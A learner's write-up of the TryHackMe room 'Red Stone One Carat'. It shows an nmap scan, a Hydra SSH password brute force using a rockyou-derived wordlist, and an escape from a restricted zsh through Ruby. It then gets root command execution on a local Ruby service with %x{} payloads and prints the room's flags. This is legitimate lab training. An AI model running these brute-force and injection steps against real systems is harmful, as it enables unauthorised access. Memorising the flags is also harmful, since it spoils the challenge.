<h1 align="center">Red Stone One Carat</h1>
<p align="center">July 28, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>448</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>First room of the Red Stone series. Hack ruby using ruby.</em>.<br>
<img width="80px" src="https://github.com/user-attachments/assets/9c2ffc32-1579-4ba9-9cb9-c5b5664b280a"><br>
Click <a href="https://tryhackme.com/room/redstoneonecarat">here </a>to access this TryHackMe CTF.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/c1ab3147-e67d-4b3f-94a8-fcda14d22133"></p>


<br>
<br>

<h2>Task 1 . <code>Info</code> . Intro</h2>
<p>Rooms of the Red Stone series share the same goals:<br>

- Discovering and learning Ruby<br>
- Scripting and hacking with Ruby<br>
- Exploiting and identifying vulnerabilities in Ruby programs<br><br>

I'll give you a valuable source to find stuff related to Offensive Security using Ruby: https://rubyfu.net/.<br>

Disclaimer: this room requires custom exploitation and scripting and is more CTF-like than real life applicable.<br>

The intended way of this challenge is to complete it by only using Ruby.</p>

<p><em>Answer the question below</em></p>

<p><code>No answer needed</code></p>

<br>

<h2>Task 2 . <code>Practical</code> . Flags</h2>
<p>Start with SSH bruteforce on user <code>noraj</code>.</p>

<p><em>Answer the questions below</em></p>

<p>1.1. SSH password. Hint : <em>The password contains "bu".</em><br>
<code>cheeseburger</code></p>


<h3>Nmap</h3>

```bash
:~/RedStoneOneCarat# nmap -sT -T4 TargetIP
...
PORT   STATE SERVICE
22/tcp open  ssh
```

```bash
:~/RedStoneOneCarat# nmap -sC -sV -Pn -p- -T4 TargetIP
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
```

<h3>Wordlist</h3>

```bash
:~/RedStoneOneCarat# grep 'bu' /usr/share/wordlists/rockyou.txt > BU_wordlist.txt
:~/RedStoneOneCarat# ls
BU_wordlist.txt
~/RedStoneOneCarat# head BU_wordlist.txt
butterfly
bubbles
buster
ladybug
bubble
buttercup
lovebug
bubblegum
butter
buddy1
```

<h3>Hydra</h3>

<p>noraj : <code>cheeseburguer</code></p>

```bash
:~/RedStoneOneCarat# hydra -l noraj -P BU_wordlist.txt ssh://TargetIP
...
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 126339 login tries (l:1/p:126339), ~7897 tries per task
[DATA] attacking ssh://TargetIP:22/
[STATUS] 179.00 tries/min, 179 tries in 00:01h, 126163 to do in 11:45h, 16 active
[22][ssh] host: TargetIP   login: noraj   password: cheeseburger
1 of 1 target successfully completed, 1 valid password found
```

<br>

<p>1.2. user.txt<br>
<code>THM{3a106092635945849a0fbf7bac92409d}</code></p>

<h3>SSH</h3>

```bash
:~/RedStoneOneCarat# ssh noraj@TargetIP
noraj@TargetIP's password: 
getent:6: command not found: grep
compdump:136: command not found: mv
red-stone-one-carat% id
zsh: command not found: id
red-stone-one-carat% pwd
/home/noraj
red-stone-one-carat% ip a
zsh: command not found: ip
red-stone-one-carat% /bin/bash
zsh: /bin/bash: restricted
```

```bash
red-stone-one-carat% echo $SHELL
/bin/rzsh
red-stone-one-carat% 
```

```bash
red-stone-one-carat% echo *
bin user.txt
```

```bash
red-stone-one-carat% echo .*
.cache .hint.txt .zcompdump.red-stone-one-carat.2406 .zcompdump.red-stone-one-carat.2475 .zshrc
```

```bash
red-stone-one-carat% echo /home/*
/home/noraj /home/vagrant
```

```bash
red-stone-one-carat% echo bin/*
bin/rzsh bin/test.rb
```


<h3>test.rb</h3>
<p>constantize</p>

```bash
red-stone-one-carat% test.rb
#!/usr/bin/ruby

require 'rails'

if ARGV.size == 3
    klass = ARGV[0].constantize
    obj = klass.send(ARGV[1].to_sym, ARGV[2])
else
    puts File.read(__FILE__)
end
```

```bash
red-stone-one-carat% ruby -e "puts File.read('user.txt')"
THM{3a106092635945849a0fbf7bac92409d}
```


<br>

<p>1.3. root.txt<br>
<code>THM{58e53d1324eef6265fdb97b08ed9aadf}</code></p>

```bash
red-stone-one-carat% ruby -e "puts File.read('.hint.txt')"
Maybe take a look at local services.
```

```bash
red-stone-one-carat% netsat -tunlp
zsh: command not found: netsat
red-stone-one-carat% netstat -tunlp
zsh: permission denied: netstat
red-stone-one-carat% ss
zsh: permission denied: ss
red-stone-one-carat% getent hosts
getent:2: permission denied: sed
getent:2: permission denied: grep
```

```bash
red-stone-one-carat% nc -zvnw 1 127.0.0.1 1-65535
```


<img width="1004" height="105" alt="image" src="https://github.com/user-attachments/assets/8f6fc95f-9f2c-46ee-b7b8-0618da4279d9" />


```bash
red-stone-one-carat% nc 127.0.0.1 31547
$ [
Forbidden character
$ ]
Forbidden character
$ (
Forbidden character
$ )
Forbidden character
$ "
Forbidden character
$ '
Forbidden character
$ %x{id}
uid=0(root) gid=0(root) groups=0(root)
$ %x{ls -lah /root}
total 32K
drwx------  4 root    root    4.0K May 17  2021 .
drwxr-xr-x 23 root    root    4.0K May 17  2021 ..
-rw-r--r--  1 root    root    3.1K May 12  2021 .bashrc
drwx------  2 root    root    4.0K May 12  2021 .cache
drwx------  3 root    root    4.0K May 12  2021 .gnupg
-rw-r--r--  1 root    root     148 Aug 17  2015 .profile
-rw-r--r--  1 vagrant vagrant   37 May 17  2021 root.txt
-rwxr-xr--  1 vagrant vagrant  612 May 17  2021 server.rb
$  %x{cat /root/*}
THM{58e53d1324eef6265fdb97b08ed9aadf}require 'socket'

server = TCPServer.new 'localhost', 31547
...
```

<br>

<h2>Task 3 . <code>Info</code> . About the author</h2>
<p>I hoped you enjoyed the room.<br>
To find out more on me (noraj) check pwn.by/noraj.<br>
You can find my other THM rooms on my THM profile.</p>

<p><em>Answer the question below</em></p>

<p>3.1. <code>No answer needed</code></p>

<br>
<br>


<h1 align="center">Completed</h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/601c35eb-722e-488b-ba10-064d3943d9f2"><br>
                 <img width="1200px" src="https://github.com/user-attachments/assets/bb40909c-6c8e-4412-ae3f-1d6e8e1a5848"></p>


<br>

<h1 align="center">My TryHackMe Journey</h1>
<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| July 28, 2025     | 448      |     147ᵗʰ    |      5ᵗʰ     |     129ᵗʰ   |     7ᵗʰ    | 117,666  |    879    |    72     |

</div>

<p align="center">Global All Time:   151ˢᵗ<br><img width="250px" src="https://github.com/user-attachments/assets/bbdc5c05-5160-4534-9c53-66be5337a006"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/aa7a991f-72a6-4a1f-80c4-44a51420625f"><br><br>
                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/b87ed072-2364-41d4-8c28-9a0128133da7"><br>
                  Global monthly:    129ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/59b4637d-d112-418e-9002-c91cd4db6832"><br>
                  Brazil monthly:      7ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/03632e68-1f3d-4c80-95e6-391a77e2f078"><br>

<br>
<h1 align="center">Thanks for Coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 
